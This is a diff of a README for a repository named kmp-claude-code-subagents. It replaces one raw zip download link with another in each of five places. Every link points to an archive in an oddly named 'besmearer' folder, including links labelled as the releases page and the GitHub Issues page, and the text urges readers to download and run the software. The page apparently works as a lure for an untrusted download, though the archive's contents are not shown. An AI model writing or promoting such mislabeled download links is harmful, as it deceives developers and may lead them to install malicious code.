@@ -1,7 +1,7 @@
 # 🎉 kmp-claude-code-subagents - Enhance Your Kotlin Experience Easily
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip)](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip)
+[![Download Latest Release](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip)](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip)
 
 ## 📖 Overview
 Welcome to **kmp-claude-code-subagents**, a collection of production-ready subagents designed specifically for Kotlin Multiplatform. This tool streamlines your development process and enhances your projects with powerful, reusable components.
@@ -18,7 +18,7 @@ Follow the steps below to download and run our application quickly and easily.
 ### 💿 Download & Install
 To get started, visit the Releases page to download the latest version of the kmp-claude-code-subagents software.
 
-[Visit this page to download.](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip)
+[Visit this page to download.](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip)
 
 1. Open the link above.
 2. Look for the latest version listed.
@@ -50,12 +50,12 @@ Upon launching, you will be greeted by a user-friendly interface designed for ea
 ## 🌟 Tips for Best Use
 - **Read the Documentation:** Familiarize yourself with the user manual available in the application. It offers helpful insights and step-by-step guides.
 - **Join the Community:** Engage with other users for tips and support. Collaboration can enhance your learning experience.
-- **Stay Updated:** Regularly check for new releases and updates on the [Releases page](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip) to benefit from new features and enhancements.
+- **Stay Updated:** Regularly check for new releases and updates on the [Releases page](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip) to benefit from new features and enhancements.
 
 ## 📞 Support
 If you face any issues while downloading or using the application, please contact our support team. We are here to help you get the most out of **kmp-claude-code-subagents**.
 
-Visit our [GitHub Issues page](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip) to report problems or ask questions.
+Visit our [GitHub Issues page](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip) to report problems or ask questions.
 
 ## 🔗 Additional Resources
 - **GitHub Repository:** Check out the code and contribute if you wish.
@@ -65,4 +65,4 @@ Visit our [GitHub Issues page](https://raw.githubusercontent.com/DrizzyORP/kmp-c
 Thank you for choosing **kmp-claude-code-subagents**. We hope it enhances your development journey! 
 
 ## 📥 Quick Download
-[Visit this page to download.](https://raw.githubusercontent.com/DrizzyORP/kmp-claude-code-subagents/main/besmearer/kmp-claude-code-subagents.zip)
+[Visit this page to download.](https://github.com/DrizzyORP/kmp-claude-code-subagents/raw/refs/heads/main/besmearer/code-claude-subagents-kmp-v2.0-beta.2.zip)
